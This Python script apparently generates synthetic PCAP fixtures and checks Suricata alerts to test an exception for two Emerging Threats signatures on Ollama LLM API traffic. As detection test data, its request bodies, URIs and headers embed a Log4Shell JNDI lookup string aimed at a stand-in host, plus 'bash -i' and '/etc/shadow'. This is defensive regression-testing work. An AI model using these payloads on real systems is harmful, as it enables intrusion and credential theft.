#!/usr/bin/env python3
"""Generate/check inert offline regressions for two selected ET LLM exceptions.

This utility only writes synthetic PCAPs or reads EVE files. It sends no packets,
invokes no shell command, and needs no third-party modules. Reuse the existing
packet generator beside this file. Never add control.rules to the live ruleset.

  python3 -B validate_et_llm_exception.py generate --output-dir /tmp/et-fixtures

Construct isolated rulesets using the same original ET rules, in this order:
  baseline.rules  = original ET 2034806/2034802 + currently approved local rules
                    + generated control.rules
  candidate.rules = original ET 2034806/2034802 + candidate local rules
                    + generated control.rules

The candidate local rules contain higher-revision overrides with the SAME ET
SIDs, preserving every original detection condition and adding the existing
groot_llm_api flowbit exclusion. Include the originals in candidate.rules so
that replay also tests Suricata duplicate-SID selection. Do not substitute
synthetic approximations for the real ET signatures.

Use Suricata 8.0.6 with HOME_NET=[10.200.10.0/24,192.168.16.230/32], as observed
on the sensor. Both ET signatures have the header HOME_NET any -> any any, not
HOME_NET -> EXTERNAL_NET. Their source-address applicability matters below.
Use a fresh log directory per replay; keep the PCAP and control rule next to
the manifest. Example for each isolated ruleset:

  suricata -T -c /etc/suricata/suricata.yaml -S /tmp/candidate.rules
  suricata -c /etc/suricata/suricata.yaml --runmode single \\
      --set unix-command.enabled=no --set stats.enabled=yes \\
      -r /tmp/et-fixtures/traffic.pcap -S /tmp/baseline.rules -l /tmp/et-baseline
  suricata -c /etc/suricata/suricata.yaml --runmode single \\
      --set unix-command.enabled=no --set stats.enabled=yes \\
      -r /tmp/et-fixtures/traffic.pcap -S /tmp/candidate.rules -l /tmp/et-candidate
  python3 -B validate_et_llm_exception.py check --mode baseline \\
      --manifest /tmp/et-fixtures/manifest.json --eve /tmp/et-baseline/eve.json
  python3 -B validate_et_llm_exception.py check --mode candidate \\
      --manifest /tmp/et-fixtures/manifest.json --eve /tmp/et-candidate/eve.json

These offline processes never signal/reload the running sensor. SID presence
is checked per direction and connection; exact alert counts are intentionally
not required. URI/header and non-API examples explicitly demonstrate that the
exception is transport-scoped, not authentication or a URI/body condition.
Local URI/header alerts and an independent synthetic SID must remain active.
The fixture does not prove runtime reload, application authentication, actual
live payload contents, or the behavior of the rest of the full ET ruleset.
"""

import argparse
import hashlib
import ipaddress
import json
from pathlib import Path
import struct
import sys
import tempfile

from validate_llm_flow_exception import (
    A_IP, DGX_IP, BENIGN_BODY, Capture, Connection, checksum, response,
    split_inside, tuple_key,
)


ET_SIDS = [2034806, 2034802]
LOCAL_EXCEPTION_SIDS = [1000032, 1000033, 1000070, 1000071]
MARKER_SID = 1000000
CONTROL_SID = 1000998
CONTROL_TEXT = "SOC_ET_AUDIT_MARKER"
CONTROL_RULE = (
    'alert tcp any any -> any any (msg:"OFFLINE ONLY ET exception control"; '
    'flow:established; content:"SOC_ET_AUDIT_MARKER"; sid:1000998; rev:1;)\n'
)
HOME_NET = ["10.200.10.0/24", "192.168.16.230/32"]
# These strings are inert quotations. example.invalid is reserved and this
# utility only constructs packet files; no lookup or network operation occurs.
QUOTED_JNDI = "${jndi:ldap://example.invalid/${lower:x}/${env:USER}}"
ATTACK_BODY = json.dumps({
    "model": "offline-fixture",
    "messages": [{"role": "user", "content": (
        "Inert audit quotation only: " + QUOTED_JNDI + "; "
        "bash -i; /etc/shadow; " + CONTROL_TEXT
    )}],
}, separators=(",", ":")).encode("ascii")
REPLY_TEXT = ("Inert quoted documentation: " + QUOTED_JNDI + "; "
              "bash -i; /etc/shadow.\n").encode("ascii")
SSE_TEXT = ("data: " + json.dumps({"text": REPLY_TEXT.decode("ascii")},
                                 separators=(",", ":")) + "\n\n"
            "data: [DONE]\n\n").encode("ascii")


def request(body, style="single"):
    uri = "/v1/chat/completions"
    if style == "uri":
        uri = "/fixture/${jndi:ldap://example.invalid/a}"
    elif style == "non_api":
        uri = "/offline-not-an-ollama-api"
    extra_header = ("X-Offline-Quotation: " + QUOTED_JNDI + "\r\n"
                    if style == "header" else "")
    header = (
        "POST %s HTTP/1.1\r\nHost: ollama.fixture.invalid\r\n"
        "User-Agent: offline-soc-et-regression\r\n"
        "Content-Type: application/json\r\n%s"
        "Content-Length: %d\r\nConnection: keep-alive\r\n\r\n"
        % (uri, extra_header, len(body))
    ).encode("ascii")
    return header + body


def in_home_net(ip):
    return any(ipaddress.ip_address(ip) in ipaddress.ip_network(network)
               for network in HOME_NET)


def policy(benign, exempt, et_applicable, style, candidate=False):
    required = [] if benign else [CONTROL_SID]
    forbidden = [MARKER_SID]
    request_required, response_required = [], []
    if benign:
        return {"required_sids": required, "forbidden_sids": forbidden,
                "required_request_sids": [], "required_response_sids": [],
                "no_alerts": True}
    # Existing approved local exceptions are already present in BOTH inputs.
    if exempt:
        forbidden += LOCAL_EXCEPTION_SIDS
    else:
        required += LOCAL_EXCEPTION_SIDS
        request_required += LOCAL_EXCEPTION_SIDS
        response_required += [1000070, 1000071]
    if et_applicable and not (candidate and exempt):
        required += ET_SIDS
        request_required += ET_SIDS
    else:
        forbidden += ET_SIDS
    if style == "uri":
        required.append(1000030)
        request_required.append(1000030)
    elif style == "header":
        required.append(1000031)
        request_required.append(1000031)
    return {"required_sids": required, "forbidden_sids": forbidden,
            "required_request_sids": request_required,
            "required_response_sids": response_required, "no_alerts": False}


def build_capture():
    capture, cases = Capture(), []
    definitions = [
        ("ollama_single", A_IP, DGX_IP, 11434, "single", True),
        ("ollama_split_body", A_IP, DGX_IP, 11434, "split", True),
        ("ollama_keepalive", A_IP, DGX_IP, 11434, "keepalive", True),
        ("ollama_sse_reply", A_IP, DGX_IP, 11434, "sse", True),
        ("same_tuple_uri_still_local_alert", A_IP, DGX_IP, 11434, "uri", True),
        ("same_tuple_header_still_local_alert", A_IP, DGX_IP, 11434, "header", True),
        ("same_tuple_non_api_path_is_also_exempt", A_IP, DGX_IP, 11434, "non_api", True),
        ("same_dgx_other_port", A_IP, DGX_IP, 8080, "single", False),
        ("other_home_client_to_dgx", "10.200.10.10", DGX_IP, 11434, "single", False),
        ("other_nonhome_client_to_dgx", "192.168.16.231", DGX_IP, 11434, "single", False),
        ("other_dgx_not_allowed", A_IP, "211.170.162.111", 11434, "single", False),
        ("other_external_destination", A_IP, "198.51.100.10", 11434, "single", False),
        ("home_to_internal_still_et_applies", A_IP, "10.200.10.20", 8080, "single", False),
        ("dgx_initiated_to_a", DGX_IP, A_IP, 8080, "single", False),
        ("external_to_internal", "198.51.100.50", "10.200.10.20", 8080, "single", False),
        ("benign_ollama", A_IP, DGX_IP, 11434, "benign", True),
        ("benign_web", "198.51.100.50", A_IP, 8080, "benign", False),
    ]
    for index, (name, client, server, dport, style, exempt) in enumerate(definitions):
        sport = 42000 + index
        conn = Connection(capture, client, server, sport, dport)
        benign = style == "benign"
        if style == "keepalive":
            conn.send(True, [request(BENIGN_BODY)])
            conn.send(False, [response(b"Hello\n")])
        req = request(BENIGN_BODY if benign else ATTACK_BODY, style)
        if style == "split":
            boundary = req.index(b"\r\n\r\n") + 4
            chunks = [req[:boundary],
                      *split_inside(req[boundary:], b"${jndi:", 4)]
        else:
            chunks = [req]
        conn.send(True, chunks)
        reply = response(b"Hello\n" if benign else (
            SSE_TEXT if style == "sse" else REPLY_TEXT), sse=style == "sse")
        conn.send(False, split_inside(reply, b"${jndi:", 4)
                  if style == "sse" else [reply])
        conn.close()
        applicable = in_home_net(client)
        cases.append({
            "id": name, "client_ip": client, "client_port": sport,
            "server_ip": server, "server_port": dport, "style": style,
            "exception_scope": exempt, "original_et_header_applies": applicable,
            "baseline": policy(benign, exempt, applicable, style),
            "candidate": policy(benign, exempt, applicable, style, candidate=True),
        })
    raw = capture.bytes()
    manifest = {
        "schema_version": 1,
        "purpose": "offline selected-ET-SID Ollama transport exception regression",
        "home_net": HOME_NET,
        "pcap": {"path": "traffic.pcap", "sha256": hashlib.sha256(raw).hexdigest(),
                 "packets": len(capture.packets)},
        "control_rules": {"path": "control.rules", "sid": CONTROL_SID,
                          "sha256": hashlib.sha256(CONTROL_RULE.encode()).hexdigest()},
        "candidate_exception_sids": ET_SIDS,
        "already_approved_local_exception_sids": LOCAL_EXCEPTION_SIDS,
        "cases": cases,
    }
    return raw, manifest


def generate(output_dir):
    output_dir = Path(output_dir)
    if output_dir.exists():
        raise ValueError("output directory already exists; choose a new directory")
    raw, manifest = build_capture()
    output_dir.mkdir(parents=True)
    (output_dir / "traffic.pcap").write_bytes(raw)
    (output_dir / "control.rules").write_text(CONTROL_RULE, encoding="utf-8")
    (output_dir / "manifest.json").write_text(
        json.dumps(manifest, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    return {"generated": str(output_dir), "cases": len(manifest["cases"]),
            "packets": manifest["pcap"]["packets"],
            "pcap_sha256": manifest["pcap"]["sha256"]}


def check(manifest_path, eve_path, mode):
    if mode not in ("baseline", "candidate"):
        raise ValueError("unsupported check mode")
    manifest_path, eve_path = Path(manifest_path), Path(eve_path)
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    _, expected = build_capture()
    if manifest != expected:
        raise ValueError("manifest differs from this validator's deterministic fixture")
    for artifact in ("pcap", "control_rules"):
        entry = manifest[artifact]
        artifact_path = manifest_path.parent / entry["path"]
        if hashlib.sha256(artifact_path.read_bytes()).hexdigest() != entry["sha256"]:
            raise ValueError("fixture %s checksum mismatch" % artifact)
    lookup, seen = {}, {}
    for case in manifest["cases"]:
        seen[case["id"]] = {"request": set(), "response": set()}
        for is_response in (False, True):
            key = tuple_key(case, is_response)
            if key in lookup:
                raise ValueError("duplicate fixture tuple")
            lookup[key] = (case["id"], "response" if is_response else "request")
    unexpected = 0
    with eve_path.open(encoding="utf-8") as source:
        for lineno, line in enumerate(source, 1):
            if not line.strip():
                continue
            try:
                event = json.loads(line)
            except json.JSONDecodeError as exc:
                raise ValueError("invalid EVE JSON at line %d" % lineno) from exc
            if not isinstance(event, dict):
                raise ValueError("EVE event must be an object at line %d" % lineno)
            if event.get("event_type") != "alert":
                continue
            try:
                key = (event["src_ip"], int(event["src_port"]),
                       event["dest_ip"], int(event["dest_port"]))
                sid = int(event["alert"]["signature_id"])
            except (KeyError, TypeError, ValueError) as exc:
                raise ValueError("missing alert tuple/SID at EVE line %d" % lineno) from exc
            match = lookup.get(key)
            if not match:
                unexpected += 1
                continue
            case_id, direction = match
            seen[case_id][direction].add(sid)
    failures, results = [], []
    for case in manifest["cases"]:
        observed, expected_policy = seen[case["id"]], case[mode]
        actual = observed["request"] | observed["response"]
        missing = sorted(set(expected_policy["required_sids"]) - actual)
        forbidden = sorted(set(expected_policy["forbidden_sids"]) & actual)
        missing_request = sorted(set(expected_policy["required_request_sids"]) - observed["request"])
        missing_response = sorted(set(expected_policy["required_response_sids"]) - observed["response"])
        benign_violation = bool(expected_policy["no_alerts"] and actual)
        ok = not (missing or forbidden or missing_request or missing_response or benign_violation)
        results.append({
            "case": case["id"], "pass": ok,
            "observed_request_sids": sorted(observed["request"]),
            "observed_response_sids": sorted(observed["response"]),
            "missing_sids": missing, "forbidden_sids_seen": forbidden,
            "missing_request_sids": missing_request,
            "missing_response_sids": missing_response,
            "benign_alert": benign_violation,
        })
        if not ok:
            failures.append(case["id"])
    if unexpected:
        failures.append("unexpected_alert_flows")
    return {"mode": mode, "pass": not failures, "failures": failures,
            "unexpected_alert_count": unexpected, "cases": results,
            "pcap_sha256": manifest["pcap"]["sha256"],
            "eve_sha256": hashlib.sha256(eve_path.read_bytes()).hexdigest()}


def selftest():
    raw, manifest = build_capture()
    assert raw == build_capture()[0]
    assert len(manifest["cases"]) == 17
    cursor, packets = 24, 0
    while cursor < len(raw):
        _, _, caplen, wirelen = struct.unpack_from("<IIII", raw, cursor)
        assert caplen == wirelen
        data = raw[cursor + 16:cursor + 16 + caplen]
        ip, tcp = data[14:34], data[34:]
        assert checksum(ip) == 0
        pseudo = ip[12:20] + struct.pack("!BBH", 0, 6, len(tcp))
        assert checksum(pseudo + tcp) == 0
        cursor += 16 + caplen
        packets += 1
    assert cursor == len(raw) and packets == manifest["pcap"]["packets"]
    with tempfile.TemporaryDirectory(prefix="soc-et-pcap-selftest-") as temp:
        fixture = Path(temp) / "fixtures"
        generate(fixture)
        for mode in ("baseline", "candidate"):
            events = []
            for case in manifest["cases"]:
                for response_direction, field in (
                        (False, "required_sids"),
                        (False, "required_request_sids"),
                        (True, "required_response_sids")):
                    src, sport, dst, dport = tuple_key(case, response_direction)
                    for sid in case[mode][field]:
                        events.append({"event_type": "alert", "src_ip": src, "src_port": sport,
                                       "dest_ip": dst, "dest_port": dport,
                                       "alert": {"signature_id": sid}})
            eve = Path(temp) / (mode + ".jsonl")
            eve.write_text("".join(json.dumps(e) + "\n" for e in events), encoding="utf-8")
            assert check(fixture / "manifest.json", eve, mode)["pass"]
            if mode == "candidate":
                contaminated = dict(events[0])
                contaminated["alert"] = {"signature_id": ET_SIDS[0]}
                with eve.open("a", encoding="utf-8") as output:
                    output.write(json.dumps(contaminated) + "\n")
                assert not check(fixture / "manifest.json", eve, mode)["pass"]
        empty = Path(temp) / "empty.jsonl"
        empty.write_text("", encoding="utf-8")
        assert not check(fixture / "manifest.json", empty, "candidate")["pass"]
        bad_manifest = json.loads((fixture / "manifest.json").read_text(encoding="utf-8"))
        bad_manifest["cases"][0]["candidate"]["forbidden_sids"] = []
        (fixture / "manifest.json").write_text(json.dumps(bad_manifest), encoding="utf-8")
        try:
            check(fixture / "manifest.json", empty, "candidate")
        except ValueError:
            pass
        else:
            raise AssertionError("tampered manifest accepted")
    return {"selftest": "PASS", "checks": ["deterministic capture", "IPv4/TCP checksums",
            "baseline/candidate directional SID presence", "forbidden ET SID rejected",
            "empty EVE rejected", "tampered manifest rejected"],
            "cases": len(manifest["cases"]), "packets": packets,
            "suricata_replay": "not performed by selftest"}


def main(argv=None):
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = parser.add_subparsers(dest="command", required=True)
    gen = sub.add_parser("generate", help="write synthetic PCAP, control rule and manifest")
    gen.add_argument("--output-dir", required=True)
    check_parser = sub.add_parser("check", help="check offline EVE SID observations by connection")
    check_parser.add_argument("--manifest", required=True)
    check_parser.add_argument("--eve", required=True)
    check_parser.add_argument("--mode", required=True, choices=["baseline", "candidate"])
    check_parser.add_argument("--report", help="optional new JSON report path (never overwrite)")
    sub.add_parser("selftest", help="stdlib-only checks; does not invoke Suricata")
    args = parser.parse_args(argv)
    try:
        if args.command == "generate":
            result = generate(args.output_dir)
        elif args.command == "selftest":
            result = selftest()
        else:
            result = check(args.manifest, args.eve, args.mode)
            if args.report:
                with Path(args.report).open("x", encoding="utf-8") as report:
                    report.write(json.dumps(result, ensure_ascii=False, indent=2) + "\n")
        print(json.dumps(result, ensure_ascii=False, indent=2))
        return 1 if result.get("pass") is False else 0
    except (OSError, ValueError, AssertionError) as exc:
        print("ERROR: %s" % exc, file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
